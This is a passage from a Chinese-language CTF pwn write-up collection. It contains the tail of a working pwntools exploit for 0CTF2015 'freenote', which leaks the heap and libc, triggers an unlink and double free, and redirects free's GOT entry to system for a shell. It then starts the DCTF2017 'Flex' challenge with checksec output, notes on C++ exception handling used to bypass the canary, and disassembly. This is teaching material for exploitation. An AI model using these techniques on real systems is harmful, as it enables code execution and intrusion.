def delnote(x):
io.recvuntil("Your choice: ")
io.sendline("4")
io.recvuntil("Note number: ")
io.sendline(str(x))
def listnote(x):
io.recvuntil("Your choice: ")
1005
6.1.7 pwn 0CTF2015 freenote
io.sendline("1")
io.recvuntil("%d. " % x)
return io.recvline(keepends=False)
def editnote(x, s):
io.recvuntil("Your choice: ")
io.sendline("3")
io.recvuntil("Note number: ")
io.sendline(str(x))
io.recvuntil("Length of note: ")
io.sendline(str(len(s)))
io.recvuntil("Enter your note: ")
io.send(s)
def leak_base():
global heap_base
global libc_base
for i in range(4):
newnote("A"*8)
delnote(0)
delnote(2)
newnote("A"*8) # note 0
s = listnote(0)[8:]
heap_addr = u64((s.ljust(8, "\x00"))[:8])
heap_base = heap_addr - 0x1940 # 0x1940 = 0x1820 + 0x90
*2
log.info("heap base: 0x%x" % heap_base)
newnote("A"*8) # note 2
s = listnote(2)[8:]
libc_addr = u64((s.ljust(8, "\x00"))[:8])
libc_base = libc_addr - (libc.symbols['__malloc_hook'] + 0x78
) # 0x78 = libc_addr - __malloc_hook_addr
log.info("libc base: 0x%x" % libc_base)
1006
6.1.7 pwn 0CTF2015 freenote
for i in range(4):
delnote(i)
def unlink():
newnote(p64(0) + p64(0) + p64(heap_base + 0x18) + p64(heap_b
ase + 0x20)) # note 0
newnote('/bin/sh\x00') # note 1
newnote("A"*128 + p64(0x1a0)+p64(0x90)+"A"*128 + p64(0)+p64(
0x21)+"A"*24 + "\x01") # note 2
delnote(3) # double free
def overwrite_note():
system_addr = libc_base + libc.symbols['system']
log.info("system address: 0x%x" % system_addr)
editnote(0, p64(2) + p64(1)+p64(8)+p64(elf.got['free']))
# Note.content = free_got
editnote(0, p64(system_addr)) # free => system
def pwn():
delnote(1) # system('/bin/sh')
io.interactive()
if __name__ == "__main__":
leak_base()
unlink()
overwrite_note()
pwn()
参考资料
0CTF 2015 Quals CTF: freenote
1007
6.1.8 pwn DCTF2017 Flex
6.1.8 pwn DCTF2017 Flex
题目复现
C++ 异常处理机制
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file flex
flex: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynam
ically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/
Linux 2.6.32, BuildID[sha1]=30a1acbc98ccf9e8f4b3d1fc06b6ba6f0cbe
7c9e, stripped
$ checksec -f flex
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 0 4 flex
可以看到开启了 Canary，本题的关键就是利用某种神秘机制（C++异常处理机制）
绕过它。
随便玩一下，了解程序的基本功能：
1008
6.1.8 pwn DCTF2017 Flex
$ ./flex
1.start flexmd5
2.start flexsha256
3.start flexsha1
4.test security
0 quit
option:
1
FlexMD5 bruteforce tool V0.1
custom md5 state (yes/No)
No
custom charset (yes/No)
yes
charset length:
10
charset:
a
bruteforce message pattern:
aaaa
把程序跑起来：
$ socat tcp4-listen:10001,reuseaddr,fork exec:./flex &
C++ 异常处理机制
$ ldd flex
linux-vdso.so.1 (0x00007ffcd837a000)
libstdc++.so.6 => /usr/lib/libstdc++.so.6 (0x00007f748fe
72000)
libgcc_s.so.1 => /usr/lib/libgcc_s.so.1 (0x00007f748fc5b
000)
libc.so.6 => /usr/lib/libc.so.6 (0x00007f748f8a3000)
libm.so.6 => /usr/lib/libm.so.6 (0x00007f748f557000)
/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-6
4.so.2 (0x00007f74901f9000)
1009
6.1.8 pwn DCTF2017 Flex
所以这个程序是一个 C 和 C++ 混合编译的，以便处理异常。
当用户 throw 一个异常时，编译器会帮我们调用相应的函数分配
_cxa_exception 就是头部， exception_obj 。异常对象由函数
__cxa_allocate_exception() 进行创建，最后由 __cxa_free_exception()
进行销毁。当我们在程序里执行了抛出异常后，编译器做了如下的事情：
1. 调用 __cxa_allocate_exception 函数，分配一个异常对象
2. 调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化
3. __cxa_throw() 调用 Itanium ABI 里的 _Unwind_RaiseException() 从
而开始 unwind，unwind 分为两个阶段，分别进行搜索 catch 及清理调用栈
4. _Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用
personality routine（ __gxx_personality_v0 ）
5. 如果该异常如能被处理（有相应的 catch），则 personality routine 会依次对调
用链上的函数进行清理。
6. _Unwind_RaiseException() 将控制权转到相应的 catch 代码
7. unwind 完成，用户代码继续执行
具体内容查看参考资料。
题目解析
程序的第四个选项很吸引人，但似乎没有发现什么突破点，而第一个选项可以输入
的东西较多，问题应该在这里，查看该函数 sub.bruteforcing_start:_500 ：
[0x00400d80]> pdf @ sub.bruteforcing_start:_500
/ (fcn) sub.bruteforcing_start:_500 63
| sub.bruteforcing_start:_500 ();
| ; CALL XREF from 0x00402200 (main)
| 0x00401500 55 push rbp
| 0x00401501 4889e5 mov rbp, rsp
| 0x00401504 4883ec10 sub rsp, 0x10
| 0x00401508 e83bfcffff call sub.FlexMD5_brut
eforce_tool_V0.1_148
| 0x0040150d e87dfaffff call fcn.00400f8f
| 0x00401512 bf4f464000 mov edi, str.brutefor
cing_start: ; 0x40464f ; "bruteforcing start:"
| 0x00401517 e8b4f6ffff call sym.imp.puts
1010
6.1.8 pwn DCTF2017 Flex
; int puts(const char *s)
| ; JMP XREF from 0x00401534 (sub.bruteforcing_star
t:_500)
| .-> 0x0040151c e88cfeffff call sub.strlen_3ad
; size_t strlen(const char *s)
| : 0x00401521 85c0 test eax, eax
| : 0x00401523 0f94c0 sete al
| : 0x00401526 84c0 test al, al
| ,== 0x00401536 b800000000 mov eax, 0
; 异常处理代码
| ,== 0x0040154b 4889c7 mov rdi, rax
|: 0x0040154e e8bdf7ffff call sym.imp.__cxa_be
gin_catch
|: 0x00401553 8b00 mov eax, dword [rax]
|: 0x00401555 8945fc mov dword [rbp - 4],
eax
|: 0x00401558 e8a3f7ffff call sym.imp.__cxa_en
d_catch
|`= 0x0040155f c9 leave
\ 0x00401560 c3 ret
; ret 到 payload_2
函数 sub.FlexMD5_bruteforce_tool_V0.1_148 ：
[0x00400d80]> pdf @ sub.FlexMD5_bruteforce_tool_V0.1_148
/ (fcn) sub.FlexMD5_bruteforce_tool_V0.1_148 613
| sub.FlexMD5_bruteforce_tool_V0.1_148 ();
| ; var int local_124h @ rbp-0x124
| ; var int local_120h @ rbp-0x120
| ; var int local_18h @ rbp-0x18
| ; CALL XREF from 0x00401508 (sub.bruteforcing_sta
rt:_500)
| 0x00401148 55 push rbp
| 0x00401149 4889e5 mov rbp, rsp
| 0x0040114c 53 push rbx
| 0x0040114d 4881ec280100. sub rsp, 0x128
| 0x00401154 64488b042528. mov rax, qword fs:[0x
28] ; [0x28:8]=-1 ; '(' ; 40
| 0x0040115d 488945e8 mov qword [local_18h]
, rax
| 0x00401161 31c0 xor eax, eax
| 0x00401163 bf47454000 mov edi, str.FlexMD5_
bruteforce_tool_V0.1 ; 0x404547 ; "FlexMD5 bruteforce tool V0.1"
| 0x00401168 e863faffff call sym.imp.puts
; int puts(const char *s)
| 0x0040116d bf64454000 mov edi, str.custom_m
d5_state__yes_No_ ; 0x404564 ; "custom md5 state (yes/No)"
| 0x00401172 e859faffff call sym.imp.puts
; int puts(const char *s)
| 0x00401177 488d85e0feff. lea rax, [local_120h]
| 0x0040117e be04000000 mov esi, 4
| 0x00401183 4889c7 mov rdi, rax
| 0x00401186 e8ebfcffff call sub.read_e76
; ssize_t read(int fildes, void *buf, size_t nbyte)
| 0x0040118b 488d85e0feff. lea rax, [local_120h]
| 0x00401192 ba03000000 mov edx, 3
1012
6.1.8 pwn DCTF2017 Flex
| 0x00401197 be7e454000 mov esi, 0x40457e
; "yes"
| 0x0040119c 4889c7 mov rdi, rax
| 0x0040119f e85cfaffff call sym.imp.strncmp
; int strncmp(const char *s1, const char *s2, size_t n)
| 0x004011a4 85c0 test eax, eax
| ,= 0x00401206 bfca454000 mov edi, str.custom_c
harset__yes_No_ ; 0x4045ca ; "custom charset (yes/No)"
| 0x0040120b e8c0f9ffff call sym.imp.puts
; int puts(const char *s)
| 0x00401210 488d85e0feff. lea rax, [local_120h]
| 0x00401217 be04000000 mov esi, 4